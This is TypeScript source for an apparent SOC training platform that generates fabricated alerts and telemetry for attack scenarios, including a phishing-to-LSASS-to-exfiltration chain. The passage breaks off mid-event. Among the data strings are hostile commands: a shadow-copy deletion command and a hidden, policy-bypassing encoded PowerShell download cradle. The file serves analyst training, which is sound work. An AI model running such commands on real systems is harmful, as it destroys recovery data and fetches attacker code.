/**
 * SOC Training Platform — Scenario Builders
 * Each scenario produces 10-12 curated, story-driven telemetry events that
 * give a student exactly the clues needed to investigate the attack chain.
 * Events have rich human-readable `description` fields shown in the log viewer.
 */
import type { Alert, IOC, ScenarioBundle, ScenarioQuestion, Severity, TelemetryEvent } from "./types";
import { makeSha256 } from "./iocs";
import { buildBackupFalsePositiveScenario } from "./scenario-packs/backupFalsePositive";
import { buildWebShellRceScenario }         from "./scenario-packs/webShellRce";
import { buildLinuxSshCryptominerScenario } from "./scenario-packs/linuxSshCryptominer";
import { buildAitmTokenTheftScenario }      from "./scenario-packs/aitmTokenTheft";
import { buildEsxiRansomwareScenario }      from "./scenario-packs/esxiRansomware";
import { buildBruteForceSingleAccountScenario } from "./scenario-packs/bruteForceSingleAccount";
import { buildRogueAdminAccountScenario }   from "./scenario-packs/rogueAdminAccount";
import { buildImpossibleTravelBasicScenario } from "./scenario-packs/impossibleTravelBasic";
import { buildSoftwareInstallFalsePositiveScenario } from "./scenario-packs/softwareInstallFalsePositive";

// ─── Alert auto-generator ────────────────────────────────────────────────────

function eventsToAlerts(events: TelemetryEvent[], scenario_id: string): Alert[] {
  const alerts: Alert[] = [];
  let aid = 0;
  // Builders declare events in narrative order, which is not always
  // chronological — several scenarios listed a tool launch after the traffic it
  // produced. Alerts must run on the clock, so sort a copy here rather than
  // relying on every builder to keep its array ordered.
  const ordered = [...events].sort((a, b) => new Date(a.ts).getTime() - new Date(b.ts).getTime());
  for (const e of ordered) {
    if (!e.mitre_technique) continue;
    if (!e.severity || e.severity === "informational" || e.severity === "low") continue;
    aid += 1;
    const sevToConf: Record<Severity, number> = { critical: 95, high: 86, medium: 72, low: 55, informational: 30 };
    const sevToRisk: Record<Severity, number> = { critical: 92, high: 78, medium: 60, low: 40, informational: 15 };
    const tactic = tacticForTechnique(e.mitre_technique);
    alerts.push({
      id: `alt_${scenario_id.slice(0, 6)}_${aid}`,
      alert_uid: vendorAlertId(e.vendor ?? e.source, scenario_id, aid),
      title: titleForTechnique(e.mitre_technique, e),
      description: descForTechnique(e.mitre_technique, e),
      source: e.source, vendor: e.vendor ?? e.source.toUpperCase(),
      severity: e.severity,
      status: "new",
      confidence: sevToConf[e.severity],
      risk_score: sevToRisk[e.severity],
      mitre_tactic: tactic, mitre_technique: e.mitre_technique,
      hostname: e.hostname, user_email: e.user_email,
      src_ip: e.src_ip, dst_ip: e.dst_ip,
      process: e.process ? { name: e.process.name, cmdline: e.process.cmdline, parent: e.process.parent_name, sha256: e.file?.sha256 } : undefined,
      url: e.network?.url, domain: e.network?.domain,
      detected_at: e.ts,
      related_events: [e.id],
    });
  }
  return alerts;
}

function vendorAlertId(vendor: string, scenarioId: string, n: number): string {
  const v = vendor.toLowerCase();
  const tag = v.includes("crowd") ? "CRWD" : v.includes("sentinel") || v.includes("microsoft") ? "MDE" :
    v.includes("splunk") ? "SPL" : v.includes("palo") ? "PAN" : v.includes("okta") ? "OKTA" :
    v.includes("aws") || v.includes("cloudtrail") ? "AWS" : v.includes("sysmon") ? "SYSMON" : "SIEM";
  const h = n.toString(16).toUpperCase().padStart(8, "0");
  return `${tag}-${h}`;
}

function titleForTechnique(t: string, _e: TelemetryEvent): string {
  switch (t) {
    case "T1566.001": return "Spearphishing attachment with macro delivered";
    case "T1059.001": return "Encoded PowerShell spawned by Office process";
    case "T1071.001": return "Outbound HTTPS beacon to uncategorized domain";
    case "T1027":     return "Obfuscated DLL written to user TEMP directory";
    case "T1218.011": return "rundll32.exe executing user-writable DLL";
    case "T1547.001": return "Registry Run key persistence established";
    case "T1003.001": return "LSASS memory dumped via comsvcs.dll MiniDump";
    case "T1110.003": return "Password spraying across multiple accounts";
    case "T1078":     return "Anomalous sign-in from new geography";
    case "T1071.004": return "DNS tunneling — high-entropy subdomain pattern";
    case "T1567.002": return "Large data download from cloud storage";
    case "T1021.002": return "Lateral movement via SMB Admin Share (PsExec)";
    case "T1569.002": return "Remote service execution via PsExec";
    case "T1490":     return "Volume shadow copies deleted — ransomware pre-stage";
    case "T1486":     return "Files encrypted with ransomware extension";
    case "T1098.001": return "Rogue OAuth app registered with broad permissions";
    case "T1564.008": return "Hidden inbox rule created to conceal attacker mail";
    case "T1528":     return "OAuth consent granted to an attacker-controlled application";
    case "T1114.002": return "Email collection via Microsoft Graph API";
    case "T1530":     return "Bulk data access from cloud storage";
    case "T1552.001": return "AWS access key committed to public GitHub repository";
    case "T1078.004": return "Valid cloud account used from attacker IP — credential confirmation";
    case "T1580":     return "Cloud infrastructure discovery — S3, EC2, Secrets Manager enumeration";
    case "T1578.002": return "Attacker launched GPU instances for cryptomining (RunInstances)";
    case "T1136.003": return "Backdoor IAM user created for persistent cloud access";
    case "T1098.001": return "AdministratorAccess policy attached to backdoor IAM user";
    case "T1496":     return "Resource hijacking — GPU instances running Monero cryptominer";
    case "T1052.001": return "Sensitive files copied to USB removable device";
    case "T1567":     return "Exfiltration to personal cloud storage";
    case "T1087.002": return "LDAP SPN enumeration — Kerberoasting reconnaissance";
    case "T1558.003": return "Kerberos TGS tickets requested with RC4 encryption (Kerberoasting)";
    case "T1041":     return "Data exfiltration via DNS tunnel";
    case "T1105":     return "certutil.exe downloading payload from attacker URL";
    case "T1218.010": return "regsvr32.exe Squiblydoo — remote COM scriptlet execution";
    case "T1218.005": return "mshta.exe executing remote VBScript";
    case "T1057":     return "wmic.exe enumerating running processes";
    case "T1197":     return "bitsadmin.exe BITS job used for persistence download";
    case "T1053.005": return "Scheduled task created for SYSTEM-level persistence";
    case "T1003.006": return "DCSync — replication credential dump from domain controller";
    case "T1003.003": return "NTDS.dit snapshot — Active Directory database extracted";
    case "T1558.001": return "Golden Ticket forged using stolen krbtgt NTLM hash";
    case "T1562.001": return "Windows Defender disabled — real-time protection tampered";
    case "T1021.001": return "RDP lateral movement via stolen admin credentials";
    case "T1136.001": return "Domain admin account created for attacker persistence";
    case "T1070.001": return "Security audit log cleared — attacker covering tracks";
    case "T1195.002": return "Trojanized software update from compromised vendor supply chain";
    case "T1083":     return "File system discovery — hunting for credentials and config files";
    case "T1021.004": return "Lateral movement via SSH using stolen private key";
    case "T1053.003": return "Cron job persistence established for malicious process";
    case "T1036.005": return "Malicious binary masquerading as legitimate vendor telemetry process";
    case "T1621":     return "MFA push bombardment — user fatigued into approving";
    case "T1558.004": return "AS-REP Roasting — TGT requested without pre-authentication";
    case "T1557.001": return "LLMNR/NBT-NS Poisoning — name-resolution answers from an unexpected host";
    case "T1610":     return "Malicious kubectl exec into production container";
    case "T1611":     return "Container escape to host — breakout onto the EC2 node OS";
    case "T1552.005": return "EC2 Instance Metadata Service (IMDS) queried for IAM credentials";
    case "T1528":     return "OAuth consent grant phishing — malicious app gains mailbox access";
    case "T1137.005": return "Inbox rule created by OAuth app to forward email externally";
    case "T1078.002": return "Domain service account used post-credential crack";
    case "T1550.003": return "Golden Ticket used for lateral movement — Pass the Ticket";
    case "T1114.003": return "Mailbox auto-forwarding rule created to external address";
    default:          return `Detection: ${t}`;
  }
}

function descForTechnique(t: string, e: TelemetryEvent): string {
  const host = e.hostname ? ` on ${e.hostname}` : "";
  const user = e.user_email ? ` (${e.user_email})` : "";
  switch (t) {
    case "T1566.001": return `Macro-enabled Office document delivered via email${user}. SPF/DKIM/DMARC all failed.`;
    case "T1059.001": return `WINWORD.EXE spawned powershell.exe with -EncodedCommand and Hidden window${host}.`;
    case "T1071.001": return `PowerShell initiated TLS connection to a recently-registered C2 domain${host}.`;
    case "T1027":     return `PE DLL written to %TEMP% by non-installer process${host}. High entropy, unsigned.`;
    case "T1547.001": return `HKCU Run key created pointing to %TEMP% DLL${host}.`;
    case "T1003.001": return `comsvcs.dll MiniDump used to dump LSASS — credential theft${host}.`;
    case "T1110.003": return `Multiple auth failures across accounts from same IP${user}.`;
    case "T1078":     return `Auth success from first-time country — stolen credentials likely${user}.`;
    case "T1071.004": return `DNS tunneling: 48+ char base32 subdomains, TXT records carrying C2 data${host}.`;
    case "T1567.002": return `Large file download (>100MB) from S3 — 650x daily baseline${user}.`;
    case "T1021.002": return `SMB connection to ADMIN$ share — PsExec lateral movement${host}.`;
    case "T1569.002": return `PSEXESVC.exe service created on remote host under NT AUTHORITY\\SYSTEM.`;
    case "T1490":     return `vssadmin delete shadows /all /quiet — prevents file recovery.`;
    case "T1486":     return `Files encrypted with .locked extension — ransomware payload active.`;
    case "T1098.001": return `OAuth app registered with Mail.ReadWrite + Files.ReadWrite.All${user}.`;
    case "T1564.008": return `Inbox rule created that files or deletes mail before the owner sees it${user}.`;
    case "T1114.002": return `Graph API MailItemsAccessed via third-party OAuth app${user}.`;
    case "T1530":     return `Bulk file download from SharePoint/S3${user}.`;
    case "T1552.001": return `AWS access key found in public GitHub commit${user} — automated secret scanner detected it 3 minutes after push.`;
    case "T1078.004": return `Attacker used stolen cloud credentials from ${e.src_ip ?? "unknown IP"} — first-ever use of this key from this location.`;
    case "T1580":     return `Rapid cloud recon: ListBuckets, DescribeInstances, ListSecrets, DescribeVpcs — all within 90 seconds from same attacker IP.`;
    case "T1578.002": return `RunInstances: GPU instances (p3.8xlarge) launched in ${e.raw["cloud.region"] ?? "us-east-1"} — XMRig miner installed via UserData script.`;
    case "T1136.003": return `Backdoor IAM user created — attacker persistence before original stolen credentials could be revoked.`;
    case "T1098.001": return `AdministratorAccess managed policy attached to backdoor IAM user — full AWS account takeover.`;
    case "T1496":     return `Cryptomining: DNS queries to pool.minexmr.com from 14 EC2 GPU instances — $342.72/hr burn rate.`;
    case "T1052.001": return `Files copied to USB removable device${host}.`;
    case "T1567":     return `Outbound upload to personal cloud storage — DLP triggered${host}.`;
    case "T1087.002": return `LDAP query enumerating all service accounts with SPNs — classic Kerberoasting pre-step${host}.`;
    case "T1558.003": return `Kerberos TGS tickets requested with RC4 encryption (0x17) — hashes can be cracked offline${host}.`;
    case "T1041":     return `Data being encoded into DNS subdomain names and exfiltrated via DNS queries${host}.`;
    case "T1105":     return `certutil.exe used to download payload from internet — legitimate tool abused as LOLBin${host}.`;
    case "T1218.010": return `regsvr32 /i:<URL> executes COM scriptlet remotely — bypasses AppLocker (Squiblydoo)${host}.`;
    case "T1218.005": return `mshta.exe executing VBScript from attacker URL — spawned by regsvr32 in LOLBin chain${host}.`;
    case "T1057":     return `wmic.exe process enumeration — post-exploitation discovery via built-in Windows tool${host}.`;
    case "T1197":     return `bitsadmin BITS job downloads attacker binary — BITS jobs run as SYSTEM and survive reboots${host}.`;
    case "T1053.005": return `Scheduled task '${e.process?.cmdline?.includes("NexaCorpHealthCheck") ? "NexaCorpHealthCheck" : "unknown"}' runs attacker payload as SYSTEM every 5 minutes${host}.`;
    case "T1003.006": return `DCSync attack: non-DC account requested DS-Replication-Get-Changes-All on ${host || "DC"} — Mimikatz is replicating all AD credential hashes.`;
    case "T1003.003": return `ntdsutil.exe created NTDS.dit snapshot${host} — contains NTLM hashes for every domain account. Can be cracked offline.`;
    case "T1558.001": return `Kerberos TGT with 87,600-hour lifetime (10 years) — Golden Ticket forged offline using stolen krbtgt hash${host}. Survives all password resets.`;
    case "T1562.001": return `Windows Defender real-time protection disabled via registry tamper${host} — attacker clearing the way for credential theft tools.`;
    case "T1021.001": return `RDP session from external IP to domain controller${host}${user} — never legitimate outside IT break-glass procedures.`;
    case "T1136.001": return `Shadow admin account created and added to Domain Admins${host}${user} — disguised as service account for stealthy persistence.`;
    case "T1070.001": return `Security audit log cleared (Event 1102)${host} — attacker destroying forensic evidence. This is the last event before logs disappear.`;
    case "T1195.002": return `Trojanized vendor software installed${host} — signed by real vendor cert but contains a malicious payload.`;
    case "T1083":     return `Credential hunting: find scanning /home /root /etc for credentials, .env, .pem files${host}.`;
    case "T1021.004": return `SSH lateral movement using stolen private key${host} — no password required; attacker pivoting to database and CI/CD servers.`;
    case "T1053.003": return `Cron job written to /etc/cron.d${host} — re-launches malicious process every 15 minutes, survives reboots.`;
    case "T1036.005": return `Malicious process masquerading as legitimate vendor binary — wrong path, unsigned, SHA256 mismatch vs. known-good${host}.`;
    case "T1621":     return `${e.src_ip ?? "Attacker"} sent 60+ Okta push notifications to exhaust${user} — user approved at 01:32 AM after 11 minutes of bombardment.`;
    case "T1558.004": return `AS-REP Roasting: account has Kerberos pre-authentication disabled (PreAuthType=0) — attacker requested TGT without credentials and will crack offline${host}.`;
    case "T1557.001": return `An LLMNR broadcast was answered by a host that does not own the requested name; the authentication that followed was relayed to ${e.dst_ip ?? "another server"}${host}.`;
    case "T1610":     return `kubectl exec into container ${e.hostname ?? "api-prod"} from unexpected external IP — attacker using compromised CI/CD token to gain container shell${host}.`;
    case "T1611":     return `nsenter used with host namespace flags to break out of the container onto the EC2 node OS${host} — container escape to full host access.`;
    case "T1552.005": return `curl to 169.254.169.254 (AWS IMDS) from inside container${host} — attacker retrieving IAM role credentials bound to the EC2 node to pivot to cloud.`;
    case "T1528":     return `Malicious OAuth app "${e.raw?.["data.office365.ExtendedProperties.AppDisplayName"] ?? "Productivity Suite Pro"}" granted Mail.ReadWrite + Files.ReadWrite.All by${user} — app silently reads all email via Graph API.`;
    case "T1137.005": return `Inbox forwarding rule created by OAuth app (not user) — all email forwarded to external address. App used delegated Graph API permissions${user}.`;
    case "T1078.002": return `Service account authenticated from new IP after offline hash crack — AS-REP roasted account now used for lateral movement${host}.`;
    case "T1550.003": return `Forged Golden Ticket presented directly to ${host || "Domain Controller"} — Kerberos accepted the ticket because krbtgt hash is still valid${user}. Survives all user password resets.`;
    case "T1114.003": return `Set-Mailbox configured ForwardingSmtpAddress to an external address${user} — persists after password reset, must be explicitly cleared.`;
    default:          return `Detection triggered: ${t}`;
  }
}

function tacticForTechnique(t: string): string | undefined {
  if (t.startsWith("T1566")) return "TA0001";
  if (t.startsWith("T1059")) return "TA0002";
  if (t.startsWith("T1547") || t.startsWith("T1543")) return "TA0003";
  if (t.startsWith("T1218") || t.startsWith("T1027") || t.startsWith("T1562")) return "TA0005";
  if (t.startsWith("T1003") || t.startsWith("T1110") || t.startsWith("T1555")) return "TA0006";
  if (t.startsWith("T1021")) return "TA0008";
  if (t.startsWith("T1569")) return "TA0002";
  if (t.startsWith("T1071")) return "TA0011";
  if (t.startsWith("T1567") || t.startsWith("T1041") || t.startsWith("T1052")) return "TA0010";
  if (t.startsWith("T1486") || t.startsWith("T1490")) return "TA0040";
  if (t.startsWith("T1098")) return "TA0003";
  if (t.startsWith("T1114") || t.startsWith("T1530")) return "TA0009";
  if (t === "T1078") return "TA0001";
  if (t.startsWith("T1087") || t.startsWith("T1046") || t.startsWith("T1057")) return "TA0007";
  if (t.startsWith("T1558")) return "TA0006";
  if (t.startsWith("T1105")) return "TA0011";
  if (t.startsWith("T1218") || t.startsWith("T1197")) return "TA0005";
  if (t.startsWith("T1053")) return "TA0003";
  if (t.startsWith("T1552")) return "TA0006";   // Credential Access
  if (t === "T1078.004") return "TA0001";        // Initial Access (valid cloud accounts)
  if (t.startsWith("T1580")) return "TA0007";   // Discovery
  if (t.startsWith("T1578")) return "TA0005";   // Defense Evasion / Resource Development
  if (t === "T1136.003") return "TA0003";        // Persistence (cloud account created)
  if (t === "T1098.001") return "TA0003";        // Persistence (account manipulation)
  if (t.startsWith("T1496")) return "TA0040";   // Impact (resource hijacking)
  if (t.startsWith("T1136")) return "TA0003";   // Persistence (account creation)
  if (t.startsWith("T1070")) return "TA0005";   // Defense Evasion (log clearing)
  if (t.startsWith("T1195")) return "TA0001";   // Initial Access (supply chain)
  if (t === "T1083") return "TA0007";           // Discovery (file search)
  if (t.startsWith("T1036")) return "TA0005";   // Defense Evasion (masquerading)
  if (t === "T1621")        return "TA0006";   // Credential Access (MFA fatigue)
  if (t === "T1558.004")    return "TA0006";   // Credential Access (AS-REP Roasting)
  if (t === "T1557.001")    return "TA0009";   // Collection (LLMNR/NTLM relay)
  if (t === "T1610")        return "TA0002";   // Execution (deploy container)
  if (t === "T1611")        return "TA0004";   // Privilege Escalation (escape to host)
  if (t === "T1552.005")    return "TA0006";   // Credential Access (IMDS)
  if (t === "T1528")        return "TA0006";   // Credential Access (steal app token)
  if (t === "T1137.005")    return "TA0003";   // Persistence (Outlook rules)
  if (t === "T1114.003")    return "TA0009";   // Collection (email forwarding rule)
  if (t === "T1078.002")    return "TA0001";   // Initial Access (domain accounts) — matches T1078/.004 above; ATT&CK does not list Lateral Movement for T1078
  if (t === "T1550.003")    return "TA0008";   // Lateral Movement (pass the ticket)
  if (t === "T1204.002")    return "TA0002";   // Execution (user opens malicious file)
  if (t === "T1219")        return "TA0011";   // Command and Control (remote access software)
  if (t === "T1176")        return "TA0003";   // Persistence (browser extensions)
  if (t === "T1566.002")    return "TA0001";   // Initial Access (spearphishing link)
  if (t === "T1556.009")    return "TA0006";   // Credential Access (modify conditional access policies)
  return undefined;
}

// =========================================================================
// Scenario 1: Phishing → PowerShell → LSASS → Cloud Exfil
// =========================================================================

export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioBundle {
  const B = new Date("2026-05-08T09:42:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim   = { hostname: "WS-FIN-2847", email: "j.smith@cryotech.com",   ip: "10.10.20.47" };
  const c2Domain = "c2-cdn-update-fb76.xyz";
  const c2Ip     = "185.134.140.139";
  const attackerIp = "91.108.56.122";
  const dllHash  = makeSha256("svchost32_lockbit_loader");

  const events: TelemetryEvent[] = [
    {
      id: "evt_01_logon", ts: T(0),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "informational",
      description: "j.smith logged on to WS-FIN-2847 from the office network during working hours.",
      raw: {
        // Windows Security Event 4624 — Successful Logon
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": "WS-FIN-2847",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1048297",
        // Subject (the process requesting logon — SYSTEM on interactive logons)
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": "WS-FIN-2847$",
        "winlog.event_data.SubjectDomainName": "CRYOTECH",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        // New Logon (the account that was logged on)
        "winlog.event_data.TargetUserSid": "S-1-5-21-3421479547-3897544621-1789562108-1103",
        "winlog.event_data.TargetUserName": "jsmith",
        "winlog.event_data.TargetDomainName": "CRYOTECH",
        "winlog.event_data.TargetLogonId": "0x8F4A21",
        "winlog.event_data.LogonGuid": "{A1B2C3D4-E5F6-A1B2-C3D4-E5F6A1B2C3D4}",
        // Logon type and process
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": "WS-FIN-2847",
        "winlog.event_data.TransmittedServices": "-",
        "winlog.event_data.LmPackageName": "-",
        "winlog.event_data.KeyLength": "0",
        "winlog.event_data.ImpersonationLevel": "%%1833",
        "winlog.event_data.ElevatedToken": "%%1843",
        // Network / process
        "winlog.event_data.IpAddress": "10.10.20.47",
        "winlog.event_data.IpPort": "0",
        "winlog.event_data.ProcessId": "0x44C",
        "winlog.event_data.ProcessName": "C:\\Windows\\System32\\winlogon.exe",
        // ECS fields
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "event.created": "2026-05-08T09:42:00.000Z",
        "user.name": "CRYOTECH\\jsmith",
        "user.domain": "CRYOTECH",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1103",
        "host.name": "WS-FIN-2847",
        "source.ip": "10.10.20.47",
        "authentication.protocol": "Kerberos",
        "authentication.status": "success",
        "logon.type": "2",
        "logon.type_description": "Interactive (local console)",
      },
    },
    {
      id: "evt_02_phish_email", ts: T(5 * MIN),
      source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victim.email, src_ip: "91.108.56.199",
      severity: "high", mitre_technique: "T1566.001",
      description: "j.smith received an email with a macro-enabled Word attachment (Invoice_Q3_Final.docm) from a domain registered 6 days ago. SPF, DKIM, and DMARC all failed.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "email.from.address": "support@cryotech-vendor.xyz",
        "email.to.address": "j.smith@cryotech.com",
        "email.subject": "Invoice Q3 Final — Action Required",
        "email.attachment.name": "Invoice_Q3_Final.docm",
        "email.direction": "inbound",
        "file.size": "47293",
        "source.ip": "91.108.56.199",
        "spf.result": "fail", "dkim.result": "fail", "dmarc.result": "fail",
        "action_result": "delivered",
        "block.reason": "Transport rule whitelist — keyword match: invoice",
        "threat.category": "Phishing",
      },
    },
    {
      id: "evt_03_macro_open", ts: T(5 * MIN + 30_000),
      source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_clicked",
      user_email: victim.email, hostname: victim.hostname,
      severity: "high",
      description: "j.smith opened Invoice_Q3_Final.docm and clicked Enable Content on WS-FIN-2847.",
      raw: {
        "event.action": "MacroEnabled", "event.outcome": "success",
        "file.name": "Invoice_Q3_Final.docm", "file.extension": ".docm",
        "process.name": "WINWORD.EXE",
        "user.name": "CRYOTECH\\jsmith", "host.name": "WS-FIN-2847",
        "macro.warning.dismissed": "true", "action_result": "macro_executed",
      },
    },
    {
      id: "evt_04_powershell", ts: T(5 * MIN + 31_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "critical", mitre_technique: "T1059.001",
      description: "WINWORD.EXE on WS-FIN-2847 spawned a hidden, Base64-encoded PowerShell process moments after the macro ran.",
      process: {
        name: "powershell.exe", pid: 5512, parent_name: "WINWORD.EXE", parent_pid: 4128,
        cmdline: "powershell.exe -ep bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAG4AZQB3AC4tV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZw==",
        user: "CRYOTECH\\jsmith", integrity: "medium",
      },
      raw: {
        // CrowdStrike Falcon — detection metadata
        "crowdstrike.event_simplename": "ProcessRollup2",
        "crowdstrike.detection.id": "ldt:c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6:1234567891",
        "crowdstrike.detection.description": "Suspicious PowerShell child process spawned by Microsoft Word with Base64-encoded command and execution policy bypass. Consistent with macro-delivered stage-1 loader.",
        "crowdstrike.detection.scenario": "suspicious_process_from_document",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
        "crowdstrike.detection.technique_id": "T1059.001",
        "crowdstrike.detection.pattern_id": "11901",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.detection.objective": "Keep Access",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.behaviors": "OfficeApplication spawned PowerShell child process|Base64 encoded command detected (-enc flag)|Execution Policy Bypass (-ep bypass)|WindowStyle Hidden process",
        "crowdstrike.sensor.id": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
        "crowdstrike.customer_id": "3f7e2a1b9c8d4e5f6a7b8c9d0e1f2a3b",
        "crowdstrike.sensor.version": "7.08.17410.0",
        "crowdstrike.network_containment_state": "Not Contained",
        "crowdstrike.tree_id": "b4c5d6e7f8a1b2c3d4e5f6a7b8c9d0e1",
        "crowdstrike.detection.link": "https://falcon.crowdstrike.com/activity/detections/detail/c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6/1234567891",
        // Event
        "event.created": "2026-05-08T09:47:31.000Z",
        "event.action": "process_created",
        // Process — powershell.exe
        "process.pid": "5512",
        "process.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.name": "powershell.exe",
        "process.command_line": "powershell.exe -ep bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAG4AZQB3AC4tV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZw==",
        "process.hash.sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1848474f30",
        "process.hash.md5": "7353f60b1739074eb17c5f4dddefe239",
        "process.integrity_level": "MEDIUM_INTEGRITY_LEVEL",
        "process.token_type": "TokenPrimary",
        "process.session_id": "1",
        // Parent — WINWORD.EXE
        "process.parent.pid": "4128",
        "process.parent.name": "WINWORD.EXE",
        "process.parent.executable": "\\Device\\HarddiskVolume3\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "process.parent.command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\jsmith\\Downloads\\Invoice_Q3_Final.docm\"",
        "process.parent.hash.sha256": "3b4c9f2a1d8e7f6c5b4a3d2e1f0c9b8a7d6e5f4c3b2a1d0e9f8c7b6a5d4e3f2",
        // Grandparent — explorer.exe
        "process.grandparent.name": "explorer.exe",
        "process.grandparent.pid": "3280",
        "process.grandparent.executable": "\\Device\\HarddiskVolume3\\Windows\\explorer.exe",
        // User
        "user.name": "CRYOTECH\\jsmith",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1103",
        // Host
        "host.name": "WS-FIN-2847",
        "host.ip": "10.10.20.47",
        "host.mac": "00-0C-29-AB-CD-EF",
        "host.os.name": "Windows 10 Pro",
        "host.os.version": "22H2",
        "host.os.build": "19045.4291",
        // Threat mapping
      },
    },
    {
      id: "evt_05_smb_lateral", ts: T(24 * MIN + 30_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: "10.10.1.20", dst_port: 445, protocol: "tcp",
      severity: "high", mitre_technique: "T1021.002",
      network: { bytes_out: 84992, bytes_in: 12288 },
      description: `WS-FIN-2847 opened an SMB session to internal file server 10.10.1.20 on port 445, allowed by rule ALLOW-INTERNAL.`,
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": victim.ip, "source.port": "49851",
        "destination.ip": "10.10.1.20", "destination.port": "445",
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.application": "msrpc-base",
        "pan.app": "msrpc-base",
        "pan.action": "allow",
        "pan.rule": "ALLOW-INTERNAL",
        "network.bytes_out": "84992", "network.bytes_in": "12288",
        "action_result": "allow",
      },
    },
    {
      id: "evt_06_dll_drop", ts: T(8 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email,
      severity: "high", mitre_technique: "T1027",
      file: { path: "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.dll", sha256: dllHash, size: 143360 },
      description: "powershell.exe wrote an unsigned DLL named svchost32.dll to jsmith's Temp folder on WS-FIN-2847.",
      raw: {
        // CrowdStrike Falcon — detection metadata
        "crowdstrike.event_simplename": "NewExecutableWritten",
        "crowdstrike.detection.id": "ldt:c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6:1234567892",
        "crowdstrike.detection.description": "Unsigned DLL with high entropy (7.8) written to user Temp directory by PowerShell. File name mimics Windows system binary (svchost). Zero global prevalence. Consistent with payload dropper activity.",
        "crowdstrike.detection.scenario": "malicious_dropper_file_write",
        "crowdstrike.detection.tactic": "Defense Evasion",
        "crowdstrike.detection.tactic_id": "TA0005",
        "crowdstrike.detection.technique": "Obfuscated Files or Information",
        "crowdstrike.detection.technique_id": "T1027",
        "crowdstrike.detection.pattern_id": "52001",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.detection.objective": "Keep Access",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.behaviors": "PowerShell wrote unsigned DLL to %TEMP%|DLL entropy 7.8 (packed or encrypted binary)|File name masquerades as Windows system binary (svchost)|Hash not seen in CrowdStrike global prevalence (unique)",
        "crowdstrike.sensor.id": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
        "crowdstrike.customer_id": "3f7e2a1b9c8d4e5f6a7b8c9d0e1f2a3b",
        "crowdstrike.sensor.version": "7.08.17410.0",
        "crowdstrike.network_containment_state": "Not Contained",
        "crowdstrike.tree_id": "b4c5d6e7f8a1b2c3d4e5f6a7b8c9d0e1",
        "crowdstrike.detection.link": "https://falcon.crowdstrike.com/activity/detections/detail/c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6/1234567892",
        // Event
        "event.code": "NewExecutableWritten",
        "event.action": "file_created",
        "event.created": "2026-05-08T09:50:00.412Z",
        // File
        "file.path": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.dll",
        "file.name": "svchost32.dll",
        "file.extension": ".dll",
        "file.size": "143360",
        "file.type": "DLL",
        "file.created": "2026-05-08T09:50:00.412Z",
        "file.hash.sha256": dllHash,
        "file.hash.md5": "9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d",
        // PE metadata
        "pe.original_filename": "(not present)",
        "pe.company_name": "(not present)",
        "pe.description": "(not present)",
        "pe.signed": "false",
        "pe.imphash": "f34d5f2d2d15c7c3e4f6b1a2d3c4e5f6",
        "pe.entropy": "7.8",
        "pe.compile_time": "2026-05-07T22:14:36Z",
        "pe.first_seen_globally": "never",
        "pe.prevalence": "1 of 1 (unique, not seen before in telemetry)",
        // Writing process — powershell.exe
        "process.name": "powershell.exe",
        "process.pid": "5512",
        "process.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
